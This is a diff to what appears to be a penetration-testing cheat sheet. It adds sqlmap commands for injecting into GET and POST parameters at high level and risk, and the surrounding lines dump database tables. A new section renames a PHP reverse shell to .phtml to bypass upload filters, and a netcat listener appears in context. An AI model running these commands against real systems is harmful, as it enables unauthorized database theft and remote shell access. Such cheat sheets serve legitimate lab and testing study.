@@ -1,4 +1,3 @@
-
 # Table of Contents
 
 * [Networking](#Networking)
@@ -9,6 +8,7 @@
 * [WEB Server](#WEB-Server)
 * [XSS](#XSS)
 * [SQL Injection](#SQL-Injection)
+* [PHP Uploading Bypass](#PHP-Uploading-Bypass)
 * [HTTP](#HTTP)
 * [FTP](#FTP)
 * [SMB](#SMB)
@@ -186,9 +186,14 @@ nc -lvnp 80
 
 ### Analysis
 
+GET URL Parameter
 ```
-# login.req is a text file with a login POST intercepted by Burp
-sqlmap -r login.req -p {POST_PARAMETER} --batch
+sqlmap -u "http://example.com/search.php?q=" -p "q" --level=3 --risk=3 --random-agent --batch
+```
+
+POST Paramenter where login.req is a text file with a login POST intercepted by Burp
+```
+sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=3 --random-agent --batch
 ```
 
 ### Navigation
@@ -198,6 +203,12 @@ sqlmap -r login.req -p u --batch --current-db
 sqlmap -r login.req -p u --batch -D {DB} --tables
 sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} --columns
 sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
+```
+
+# PHP Uploading Bypass
+
+```
+mv reverse_shell.php reverse_shell.phtml
 ```
 
 
